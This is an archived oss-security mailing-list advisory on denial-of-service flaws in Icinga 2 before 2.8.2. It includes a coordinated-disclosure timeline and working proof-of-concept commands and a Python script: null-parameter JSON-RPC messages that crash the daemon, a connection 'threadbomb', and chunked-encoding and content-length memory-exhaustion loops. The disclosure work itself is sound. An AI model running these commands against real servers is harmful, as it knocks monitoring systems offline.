X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["12293" "Thursday" "22" "March" "2018" "14:11:01" "+0100" "Michael Hanselmann" "public@hansmi.ch" "<38c70cad-1b1b-4493-189b-28dfcf0ec4bd@msgid.hansmi.ch>" "403" "[oss-security] Denial of service and other vulnerabilities in Icinga 2.x before version 2.8.2 (CVE-2018-6532, CVE-2018-6534, CVE-2018-6535)" "^Date:" nil nil "3" "2018032213:11:01" "[oss-security] Denial of service and other vulnerabilities in Icinga 2.x before version 2.8.2 (CVE-2018-6532, CVE-2018-6534, CVE-2018-6535)" (number mark "U       public@hansm Mar 22  403/12293 " thread-indent "\"[oss-security] Denial of service and other vulnerabilities in Icinga 2.x before version 2.8.2 (CVE-2018-6532, CVE-2018-6534, CVE-2018-6535)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15578 invoked by uid 550); 22 Mar 2018 13:15:42 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 30666 invoked from network); 22 Mar 2018 13:11:23 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=hansmi-ch.20150623.gappssmtp.com; s=20150623;
        h=sender:from:subject:to:message-id:date:mime-version;
        bh=ViLbx0YnpuhiW6/v96slcJAsWNArX+bWl3wu9GlPCCc=;
        b=ADKCp0kSOkO7EvKLAxUdxOEsvIvupAUl5vK5sDigt8aNUMnUCEu9hWhxd4eCS91G89
         oWhOP/m4L7qsolUs+SnrE8fZEC/s07O2DeNYMI64QqZRqjk18kci9LBKGjQt3EPqU1Mr
         D9u6m+iP38s6WDnd6QfkU2siRXkuPJ871pP3TfpHA9A3CTYiKBxVx2e0gSvz0fQWpfLS
         nyE8jAELFh0J50ZG07iz5Okv5UUbbYUexXouiL0rdJYoYxIDWRFP5rhNVvBpYy8mnjzZ
         CzZi3l1yd4ZUGIhA4W3K3AIxhOH67F/3DGYeIWXHi7pEyyi6yZDUpMUpu60wilwkyyuh
         t7/w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:sender:from:subject:to:message-id:date
         :mime-version;
        bh=ViLbx0YnpuhiW6/v96slcJAsWNArX+bWl3wu9GlPCCc=;
        b=TPzvKeNwPvu+FVaYiJ8SEQXFEe9W6Be86BqUgo3hzp8qhRvoCiG2D+D2tqITbwQGNA
         YO1cyE9G1Y+PoiZj8f2ovaXZ9hh40T84irE0GSCKZyZgNzStK4LWRTnhncqy3Q7gvtrc
         iOyuwnVaYV6xKVZ6dV8GpkNTkZu783miwFLMcll+BdNPU/sU8O5TbaipOO40/Oj46YD9
         xEdKcqoYDx9EyWA/vR+I0GBs40SpE3mx5xgwyWmoY3BmquzzBRNXuEDMLNKB/WtmqxFz
         6yB9oa9IZeOVbNVAVv08JshFPbL0Ajl6yycbDOucqO+oOK9D0Bn2pxNjegwIdzF0zH+k
         5mzw==
X-Gm-Message-State: AElRT7H9kijUmORNeuuna4hKQUZy94oeeD3bY9PP5XfUpUjsV8+PxFtD
	213rAqEzfHuL1Q92GaoldMf+l7XYxjI=
X-Google-Smtp-Source: AG47ELslXlzGLhpiC+/IO//rR/DYgE2Qw37ypq/KFJCYe6m3bNCdW/pxqJgshpa7dw7eE9UVEqJF3A==
X-Received: by 10.80.224.205 with SMTP id j13mr26047063edl.304.1521724271226;
        Thu, 22 Mar 2018 06:11:11 -0700 (PDT)
X-Hello-World:  This header intentionally left blank
Message-ID: <38c70cad-1b1b-4493-189b-28dfcf0ec4bd@msgid.hansmi.ch>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
 protocol="application/pgp-signature";
 boundary="poq2GFWnFMXvLSPniWirEtviPoQXMf0nz"
Date: Thu, 22 Mar 2018 14:11:01 +0100
From: Michael Hanselmann <public@hansmi.ch>
Reply-To: oss-security@lists.openwall.com
Sender: Michael Hanselmann <hansmi@hansmi.ch>
Subject: [oss-security] Denial of service and other vulnerabilities in Icinga 2.x before
 version 2.8.2 (CVE-2018-6532, CVE-2018-6534, CVE-2018-6535)
To: oss-security@lists.openwall.com

--poq2GFWnFMXvLSPniWirEtviPoQXMf0nz
Content-Type: multipart/mixed; boundary="iIFEh4px0l4vjMO3vs2F6XZioIzWnMzM3";
 protected-headers="v1"
From: Michael Hanselmann <public@hansmi.ch>
To: oss-security@lists.openwall.com
Message-ID: <38c70cad-1b1b-4493-189b-28dfcf0ec4bd@msgid.hansmi.ch>
Subject: Denial of service and other vulnerabilities in Icinga 2.x before
 version 2.8.2 (CVE-2018-6532, CVE-2018-6534, CVE-2018-6535)

--iIFEh4px0l4vjMO3vs2F6XZioIzWnMzM3
Content-Type: text/plain; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: quoted-printable

A series of denial of service (DoS) vulnerabilities was discovered in
Icinga2, an Open Source network monitoring program. While some lead to
excessive resource usage, others cause the server daemon to terminate
after asserting on pointer values.

All reported issues have been fixed in Icinga 2.8.2.

Other security researchers may find information on how to report
security issues at <https://www.icinga.com/community/security/>. This
advisory is also available at
<https://hansmi.ch/articles/2018-03-icinga2-security>.


CVEs
----

CVE-2018-6532: By sending specially crafted requests, authenticated and
unauthenticated, an attacker can exhaust a lot of memory on the server
side, triggering the OOM killer.
Patches: https://github.com/Icinga/icinga2/pull/6103 and others

CVE-2018-6534: By sending specially crafted messages, an attacker can
cause a NULL pointer dereference, which can cause Icinga2 to crash.
Patches: https://github.com/Icinga/icinga2/pull/6104

CVE-2018-6535: Lack of a constant-time password comparison function can
disclose the password to an attacker.
Patches: https://github.com/Icinga/icinga2/pull/5715


Timeline
--------

2018-01-16 to 2018-01-18: An investigation after a program crash while
configuring Icinga2 led to the discovery of a series of denial of
service (DoS).

2018-01-18: A GnuPG-encrypted e-mail was sent to one of Icinga2's core
developers asking for the appropriate contact address for security
concerns. As of January 29, 2018 no reply was received.

2018-01-19: A work colleague sends an e-mail with a question to the same
effect to CEO of Netways. As of January 29, 2018 no reply was received.

2018-01-29: An initial version of this report is sent to info@icinga.com
and info@netways.de.

2018-01-31: Icinga project confirms the verification of all findings and
starts working on patches.

2018-02-07: Icinga project delivers first set of patches and makes minor
changes after review by reporter. CVE numbers have been requested and
assigned.

2018-02-22: Changes are merged into public Git master branch.

2018-02-23: Reviewed code in more depth and reported one missing fix and
one new issue. Documentation for future security issue reports is
available at <https://www.icinga.com/community/security/>.

Late February 2018 to early March 2018: Icinga merges more changes
related to reported issues.

2018-03-19: Author is informed that a release is planned for March 22,
2018.

2018-03-22: Icinga releases version 2.8.2.


Environment
-----------

Tests were made with Icinga2 v2.8.0-187-g025abc335 on
Debian 9 (Stretch).


Technical comment
-----------------

In most places Icinga2 uses Boost's intrusive_ptr<T> to store pointers
rather than raw pointers. intrusive_ptr<T>::operator* and
intrusive_ptr<T>::operator-> assert that the pointer value is not NULL.
At least the upstream builds for Debian Stretch have these assertions
enabled. Other environments may not, thus leading to an actual NULL
pointer dereference.


Unauthenticated DoS
-------------------

Null pointer dereference in JsonRpcConnection::SendMessage (m_Endpoint
is nullptr):

---
msg=3D$(jq --null-input --compact-output --raw-output '{
  "id": "foo",
  "jsonrpc": "2.0",
  "method": "",
  "params": {}
}') && \
{ sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \
openssl s_client -connect 192.0.2.1:5665
---

Null pointer dereference in JsonRpcConnection::HeartbeatAPIHandler
(params->Get):

---
msg=3D$(jq --null-input --compact-output --raw-output '{
  "id": "foo",
  "jsonrpc": "2.0",
  "method": "event::Heartbeat",
  "params": null
}') && \
{ sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \
openssl s_client -connect 192.0.2.1:5665
---

Null pointer dereference in UpdateCertificateHandler (params->Get):

---
msg=3D$(jq --null-input --compact-output --raw-output '{
  "id": "foo",
  "jsonrpc": "2.0",
  "method": "pki::UpdateCertificate",
  "params": null
}') && \
{ sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \
openssl s_client -connect 192.0.2.1:5665
---

Null pointer dereference in ApiListener::ConfigUpdateObjectAPIHandler
(params->Get):

---
msg=3D$(jq --null-input --compact-output --raw-output '{
  "id": "foo",
  "jsonrpc": "2.0",
  "method": "config::UpdateObject",
  "params": null
}') && \
{ sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \
openssl s_client -connect 192.0.2.1:5665
---

Authenticated DoS
-----------------

Null pointer dereference in ApiListener::ConfigDeleteObjectAPIHandler
(params->Get), requires accept_config=3Dtrue, to pass validation both
endpoints must be in same zone or destination must be a child:

---
msg=3D$(jq --null-input --compact-output --raw-output '{
  "id": "foo",
  "jsonrpc": "2.0",
  "method": "config::DeleteObject",
  "params": null
}') && \
{ sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \
openssl s_client -connect 192.0.2.1:5665 -key client.key \
  -cert client.crt -CAfile ca.crt
---

Null pointer dereference in Checkable::ExecuteRemoteCheck (macros=3DNULL),
to pass validation both endpoints must be in same zone or destination
must be a child:

---
msg=3D$(jq --null-input --compact-output --raw-output '{
  "id": "bar",
  "jsonrpc": "2.0",
  "method": "event::ExecuteCommand",
  "params": {
    "host": "client",
    "command_type": "check_command",
    "command": "yum",
    "macros": null
  }
}') && \
{ sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \
openssl s_client -connect 192.0.2.1:5665 -key client.key \
  -cert client.crt -CAfile ca.crt
---

Multi-master HA setup, both endpoints must be in same zone, NULL pointer
dereference in ClusterEvents::ExecuteCommandAPIHandler (params->Get),
dereference location depends on accept_commands (works with either
value):

---
msg=3D$(jq --null-input --compact-output --raw-output '{
  "id": "foo",
  "jsonrpc": "2.0",
  "method": "event::ExecuteCommand",
  "params": null
}') && \
{ sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \
openssl s_client -connect 192.0.2.1:5665 -key server.key \
  -cert server.crt
---

ApiListener::ConfigUpdateHandler (params->Get), requires
accept_config=3Dtrue, to pass validation both endpoints must be in same
zone or destination must be a child:

---
msg=3D$(jq --null-input --compact-output --raw-output '{
  "id": "foo",
  "jsonrpc": "2.0",
  "method": "config::Update",
  "params": null
}') && \
{ sleep 1; echo "${#msg}:${msg},"; sleep 3; } | \
openssl s_client -connect 192.0.2.1:5665 -key client.key \
  -cert client.crt
---

Authenticated script execution leads to pointer dereference
-----------------------------------------------------------

Execute script and pass "null" as pointer value, requires "console"
permission, may also apply to other functions available via script and
taking pointers:

---
curl -H 'Accept: application/json' -XPOST -v -k -u "user:password" \
  'https://192.0.2.1:5665/v1/console/execute-script?command=3Dget_check_com=
mand%28%22dummy%22%29.execute%28null%2C%20null%2C%20null%2C%20false%29'
---

Excessive resource usage
------------------------

Unbounded resource usage due to spawning one thread per connection; this
Python script is effectively a threadbomb on the destination and uses
all available memory on the Icinga server (~14.8k connections used
~780 MB of RAM on a x86_64 system); clients not sending anything are
never terminated:

---
import resource
import socket
import time

resource.setrlimit(resource.RLIMIT_NOFILE, (131072, 131072))

conn =3D []

while True:
    try:
        conn.append(socket.create_connection(('192.0.2.1', 5665)))
    except BaseException as err:
        print(err)
        break

print(len(conn))

while True:
    time.sleep(1)
---

Produce std::bad_alloc in HttpChunkedEncoding::ReadChunkFromStream
(length indicator is signed integer; size check seems to prevent worse
things); same principle should work in responses to clients

---
{ sleep 1; echo -ne 'GET / HTTP/1.1\nConnection: close\nAccept: application=
/json\nTransfer-Encoding: chunked\n\n-2\r\nDummy\r\n0\r\n\r\n'; sleep 5; } =
| \
openssl s_client -connect 192.0.2.1:5665
---

Consume lots of memory, sometimes leading to assertions (requires
sufficient bandwidth to server):

---
{ sleep 1; echo -ne 'GET / HTTP/1.1\nConnection: close\nAccept: application=
/json\nTransfer-Encoding: chunked\n\nFFFFFFFF\r\n'; while true; do dd if=3D=
/dev/zero bs=3D1M; done; } | \
openssl s_client -connect 192.0.2.1:5665
---

Consume lots of memory and CPU; can trigger OOM killer; run multiple
instances in parallel:

---
for i in {0..10}; do \
  { \
    sleep 1; echo -ne '999999999:'; \
    while true; do dd if=3D/dev/zero bs=3D1M; done; \
  } | openssl s_client -connect 192.0.2.1:5665 &
done; wait
---

Inject many messages into queue and trigger OOM killer:

---
for _ in {0..1000}; do \
  { \
  msg=3D$(jq --null-input --compact-output --raw-output '{
    "id": "foo",
    "jsonrpc": "2.0",
    "method": "icinga::Hello",
    "params": {}
  }') && \
  sleep 1; \
  for ((i=3D0; ; ++i)); do \
    echo -n "${#msg}:${msg},${#msg}:${msg},${#msg}:${msg},${#msg}:${msg},";=
 \
  done \
  } | socat stdin OPENSSL:192.0.2.1:5665,verify=3D0,rcvbuf=3D10,rcvbuf-late=
=3D10 &
done; wait
---

Invoke OOM killer (negative content length):

---
{ sleep 1; echo -ne 'GET / HTTP/1.1\nConnection: close\nAccept: application=
/json\nContent-Length: -999\n\nfoobar'; dd if=3D/dev/zero bs=3D1M; } | \
openssl s_client -connect 192.0.2.1:5665
---

Provoke OOM killer by filling internal JSON message queue:

---
for _ in {0..1000}; do \
  { \
  msg=3D$(jq --null-input --compact-output --raw-output '{
    "id": "foo",
    "jsonrpc": "2.0",
    "method": "icinga::Hello",
    "params": {}
  }') && \
  sleep 1; \
  for ((i=3D0; ; ++i)); do \
    echo -n "${#msg}:${msg},${#msg}:${msg},${#msg}:${msg},${#msg}:${msg},";=
 \
  done \
  } | socat stdin OPENSSL:192.0.2.1:5665,verify=3D0,rcvbuf=3D10,rcvbuf-late=
=3D10 &
done; wait
---

Bonus findings
--------------

HttpServerConnection::ProcessMessageAsync doesn't use constant-time
password comparison (https://codahale.com/a-lesson-in-timing-attacks/).

EventQueue::ProcessEvent and FilterUtility::GetFilterTargets use "&*" on
a possibly-NULL std::unique_ptr; it's the author's understanding that
doing so may be undefined behaviour and should be avoided:
http://www.open-std.org/jtc1/sc22/wg21/docs/cwg_active.html#232
(drafting as of this writing); std::unique_ptr<T>::get may be more
suitable.

There is no way to disable unauthenticated connections, i.e. those
without client certificates. In environments where the certificates are
configured through other means, i.e. Puppet, remote connections could be
limited to those presenting a client certificate.


--iIFEh4px0l4vjMO3vs2F6XZioIzWnMzM3--

--poq2GFWnFMXvLSPniWirEtviPoQXMf0nz
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEENEVC6w7lpobWh8t0Yy8zJpbbY3YFAlqzq2UACgkQYy8zJpbb
Y3brqQ//YtzSyP2HxTXyqAH7QcKQlBFBZsSfPvLKgqcJtUh1w1YpRRT8CWF12O6x
MNm7ngvYi1EECZwRjoHr05dqahGV9L2f2hW90pamAb82Z2CAo5Dhdje5aZUByKpU
kCBmSTJYuuL9BbyJsE03Lgcf0r9AKUwMySibBKKAnPL9H9ImHnnTaTsNIWJPsyKI
yJrQ/i9TtLwgvf2RqxrqzX5SzwMX/dR+fZVeGUt97OZrxbe5ULtQq+zHzmV8xjNg
ca3ENQoeOGEZOAM/+ycxXHcz9Te2ArwOTf3rq6CImdQhcA8u2wishNDneOe1x4MN
872qmGmKcmIotpLv9BuyLzWPa7LYb1OL4oGNaiEhGQl/3P60P3JOFhoJu1fus3p1
Rfm1M4Qotxow7A19lplxRW1KgPBMoJwuFZpOJMdhrYXm9J0W2dSWGwCw92FheIem
OjQ9KuxF6iggzRfPfLNStyxHXVRtTI9qrOGzigA88iN7sFOpjiuDrsvwI8vlIXqX
sGR6MidhXTuyQY7M+sc0x5q7hzNlVefkzkLsTbqckj6LmuaNJQOMxwD3ne6lbj6S
wAa5uY1MVehQ7xgbizSziC8w2G2S+BlAOmxJT9Q+2QiaRTEvCqJ6jNzjhfp+E0T4
ElOygIh64dTficdA6zTkqnUXAV7wBqVUM0+ss+Rf7fk+q5PT8xM=
=epY5
-----END PGP SIGNATURE-----

--poq2GFWnFMXvLSPniWirEtviPoQXMf0nz--
